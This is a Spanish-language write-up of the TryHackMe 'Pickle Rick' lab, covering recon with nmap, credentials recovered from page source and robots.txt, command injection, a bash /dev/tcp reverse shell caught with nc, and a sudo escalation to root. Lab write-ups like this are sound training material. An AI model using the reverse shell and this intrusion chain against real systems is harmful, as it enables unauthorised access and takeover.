---
tags:
title: PikleRick - Easy (THM)
permalink: /PikleRick-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
zs1n@ptw ~> nmapf 10.66.142.44
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 15:18 -0400
Initiating Ping Scan at 15:18
Scanning 10.66.142.44 [4 ports]
Completed Ping Scan at 15:18, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:18
Completed Parallel DNS resolution of 1 host. at 15:18, 0.50s elapsed
Initiating SYN Stealth Scan at 15:18
Scanning 10.66.142.44 [65535 ports]
Discovered open port 80/tcp on 10.66.142.44
Discovered open port 22/tcp on 10.66.142.44
Completed SYN Stealth Scan at 15:18, 10.35s elapsed (65535 total ports)
Nmap scan report for 10.66.142.44
Host is up, received echo-reply ttl 62 (0.17s latency).
Scanned at 2026-03-09 15:18:25 EDT for 10s
Not shown: 49094 closed tcp ports (reset), 16439 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.19 seconds
           Raw packets sent: 97236 (4.278MB) | Rcvd: 49146 (1.972MB)
-e [*] IP: 10.66.142.44
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 15:18 -0400
Nmap scan report for 10.66.142.44
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 55:fe:4a:61:09:43:a5:b0:1e:6c:9a:ac:11:91:13:6a (RSA)
|   256 90:36:fe:1f:ac:6f:cf:54:66:ac:d5:7b:21:6d:fb:55 (ECDSA)
|_  256 5b:09:c5:01:88:1c:cf:6e:d9:b3:8a:1e:eb:07:81:e7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```
## Website

En la pagina principal no muestra nada de nada.

![image-center](/assets/images/Pasted image 20260309161931.png)
### Source code

En el codigo fuente de la misma, sin embargo, muestra el nombre de usuario.

![image-center](/assets/images/Pasted image 20260309162008.png)
## Shell as www-data

Yendo a la pagina de `/login.php` vi el siguiente panel de login. El cual no puedo acceder debido a que no tengo las credenciales del usuario.

![image-center](/assets/images/Pasted image 20260309162039.png)
### Robots.txt

Sin embargo yendo al archivo `robots.txt`, veo un texto.

![image-center](/assets/images/Pasted image 20260309165525.png)
### Command injection

Usando las mismas credenciales, accedo al panel de administración, en donde puedo ejecutar comandos.

![image-center](/assets/images/Pasted image 20260309170042.png)
### Shell

Así que use la siguiente linea para enviarme una shell a mi maquina.

```bash
bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1'
```

Y desde mi listener `nc` recibo la conexión como el usuario `www-data`.

```bash
root@ip-10-64-153-154:~/Desktop/rick# nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.64.130.146 37382
bash: cannot set terminal process group (997): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-64-130-146:/var/www/html$
```

```bash
www-data@ip-10-64-130-146:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

..snip..

www-data@ip-10-64-130-146:/home/rick$ cat "se 	
cat "second ingredients" 
1 jerry tear
```
## Shell as root
### Sudo privileges

Viendo los privilegios de este usuario, tiene la capacidad de ejecutar cualquier comando como `root`.

```bash
www-data@ip-10-64-130-146:/home/rick$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-64-130-146:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-64-130-146:
    (ALL) NOPASSWD: ALL
```
### Shell

Así que solo me quedo usar `sudo` para convertirme en dicho usuario.

```bash
www-data@ip-10-64-130-146:/home/rick$ sudo -i
sudo -i
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat 3rd.txt
3rd ingredients: fleeb juice
```

`~Happy Hacking.`